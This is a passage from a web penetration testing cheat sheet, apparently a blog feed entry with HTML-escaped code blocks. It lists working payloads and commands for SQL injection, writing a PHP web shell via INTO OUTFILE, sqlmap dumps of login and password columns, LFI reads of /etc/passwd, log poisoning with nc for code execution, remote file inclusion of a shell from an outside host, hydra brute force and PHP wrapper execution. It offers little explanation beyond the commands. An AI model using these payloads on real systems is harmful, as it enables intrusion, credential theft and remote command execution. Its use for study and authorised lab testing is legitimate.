%25&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--Test until find the number of fields&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;administration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,version(),user(),database()&apos;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;blind-sql-injection&quot;&gt;Blind SQL Injection&lt;/h3&gt;
&lt;p&gt;When we dont have error response.&lt;/p&gt;

&lt;h3 id=&quot;blind-post-sqli&quot;&gt;Blind Post SQLi&lt;/h3&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; and length(database()) = 7 &apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Will do request until to find the right lenght of database name&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; and ascii(substring(database(),1,1)) = 100 #&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Will check character of the name until find all&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; and (select length(group_concat(table_name))) = 35 from information_schema.tables where table_schema=&quot;dbtest&quot;)#&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- To discover the name lenght of the tables. Repeat  the same steps to find the names, character by character.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;time-based-sql-injection&quot;&gt;Time based SQL Injection&lt;/h3&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; or sleep(5)#&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- If sleep 6 sec is working the command. &lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; or if (database() = char(100,98,109,114,116,117,114), sleep(3),0)#&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- If was right the comparison will sleep.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;sql-to-rce&quot;&gt;SQL TO RCE&lt;/h3&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union all select 1,2,3,4,&quot;&amp;lt;?php system($_GET[&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;]);?&amp;gt;&quot; INTO OUTFILE &quot;/var/www/html/adm/banners/rce.php&quot; %23&apos;&lt;/span&gt; 

&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;banners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifconfig&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;sqlmap&quot;&gt;SqlMap&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —current-db 
sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —dbs 
sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; databasename —tables 
sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; databasename &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; tablename —columns 
sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; databasename &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;login,pass&apos;&lt;/span&gt; —dump 
sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —current-user 
sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —users 
sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php&quot;&lt;/span&gt; —forms 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;xss-cross-site-scripting&quot;&gt;XSS Cross Site Scripting&lt;/h2&gt;
&lt;p&gt;Links:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://brutelogic.com.br/blog/&quot;&gt;Brutelogic&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;reflect&quot;&gt;Reflect&lt;/h3&gt;

&lt;h3 id=&quot;self-xss&quot;&gt;Self-XSS&lt;/h3&gt;
&lt;p&gt;The script go to the page.&lt;/p&gt;

&lt;h3 id=&quot;stored-xss&quot;&gt;Stored XSS&lt;/h3&gt;
&lt;p&gt;When is possible salve a code in the page, so every time that the page is load the script execute. Can steal cookies, passwords, etc.&lt;/p&gt;

&lt;h3 id=&quot;dom-xss&quot;&gt;Dom XSS&lt;/h3&gt;

&lt;h3 id=&quot;automation&quot;&gt;Automation&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 xsstrike &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://172.16.10.1/turismo/procurar.php?busca=&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Test parameters&lt;/span&gt;
python3 xsstrike &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://172.16.10.1/turismo/procurar.php&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Find parameters in page&lt;/span&gt;
python3 xsstrike &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://172.16.10.1/turismo/procurar.php/&quot;&lt;/span&gt; —path &lt;span class=&quot;c&quot;&gt;# Search by self-xss&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;lfi-local-file-inclusion&quot;&gt;LFI Local File Inclusion&lt;/h2&gt;
&lt;p&gt;Application receive a parameter that execeute a command direct, without handling the input.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;172.16.1.10/administration/info.php?p=/../../../../etc/passwd -&amp;gt; Read&lt;/li&gt;
  &lt;li&gt;172.16.1.10/administration/info.php?p=/../../../../etc/passwd%00 -&amp;gt; Null byte bypass.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;LFI to RCE - Log infection&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;172.16.1.10/administration/info.php?p&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/../../../../var/log/apache2/access.log &lt;span class=&quot;c&quot;&gt;# Read a log file. in this case the apche log.&lt;/span&gt;

nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 172.16.1.10 80 &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ?&amp;gt; &lt;span class=&quot;c&quot;&gt;# Sending data to register in log&lt;/span&gt;

172.16.1.10/administration/info.php?p&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/../../../../var/log/apache2/access.log&amp;amp;p&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;whereis nc &lt;span class=&quot;c&quot;&gt;# Execute the rce in log file.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;rfi--remote-file-inclusion&quot;&gt;RFI  Remote File Inclusion&lt;/h2&gt;
&lt;p&gt;It’s possible to include a remote file in system.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;172.16.1.10/administration/link.php?link=https://172.90.0.37:8080/shell&amp;amp;p=id&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;html-injection&quot;&gt;HTML Injection&lt;/h2&gt;
&lt;p&gt;It’s possible inject a html in the page.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;“172.16.1.10/administration/search.php?ps=&lt;a href=&quot;http://172.90.0.37/&quot;&gt;&amp;lt;h1&amp;gt;Amazing link hacker&amp;lt;/h1&amp;gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;path-traversal--directory-traversal&quot;&gt;Path Traversal | Directory Traversal&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;172.16.1.10/administration/test.php?banners=/ -&amp;gt; Will list all files inside the directory.&lt;/li&gt;
  &lt;li&gt;172.16.1.10/administration/test.php?banners=/../ -&amp;gt; Will back one directory in path.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;command-injection&quot;&gt;Command injection&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;commix &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://172.16.1.10/hosting —data&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;site=whoami&quot;&lt;/span&gt; : 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;path-disclosure&quot;&gt;Path disclosure&lt;/h2&gt;
&lt;p&gt;When we can see the application path.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;/var/www/html/adminstration/index.php&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;open-redirect&quot;&gt;Open redirect&lt;/h2&gt;
&lt;p&gt;Is a redirect that allow to change the destination to our target.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;www.test.com/redirect.php?url=http://attacker.com&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;brute-force&quot;&gt;Brute force&lt;/h2&gt;
&lt;p&gt;Hydra&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; pass.txt 172.16.1.10 http-post-form &lt;span class=&quot;s2&quot;&gt;&quot;/adm/login.php:login=^USER^&amp;amp;PASS=^PASS^&amp;amp;Login:FAIL&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;source-code-analisys&quot;&gt;Source Code analisys&lt;/h2&gt;

&lt;h2 id=&quot;php-wrappers&quot;&gt;PHP wrappers&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://test.com/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data://text/plan&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;,hash 

http://test.com/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data://text/plan&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;cms&quot;&gt;CMS&lt;/h2&gt;
&lt;h3 id=&quot;wordpress&quot;&gt;Wordpress&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://wpvulndb.com&quot;&gt;wpvulndb.com&lt;/a&gt;: Vulnetabilities database&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan —url http://test.com/blog —api-token token
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;joomla&quot;&gt;JOOMLA&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joomscan &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://172.100.0.106
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;webdav&quot;&gt;Webdav&lt;/h2&gt;
&lt;p&gt;Is a set of extensions for the HTTP.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cadaver http://172.16.1.10/webdav/ &lt;span class=&quot;c&quot;&gt;# Open a connection to execute commands&lt;/span&gt;

davtest &lt;span class=&quot;nt&quot;&gt;-url&lt;/span&gt; http://172.16.1.10/webdav/ &lt;span class=&quot;c&quot;&gt;# Upload files and execute it.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;xxe&quot;&gt;XXE&lt;/h2&gt;

&lt;h2 id=&quot;ssrf&quot;&gt;SSRF&lt;/h2&gt;
&lt;h2 id=&quot;csrf&quot;&gt;CSRF&lt;/h2&gt;
&lt;h2 id=&quot;template-injection&quot;&gt;Template injection&lt;/h2&gt;
&lt;h2 id=&quot;subdomain-takeover&quot;&gt;Subdomain Takeover&lt;/h2&gt;</content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="web" /><category term="pentesting" /><summary type="html">This is a guide for Web pentesting</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/web_pentesting.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/web_pentesting.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>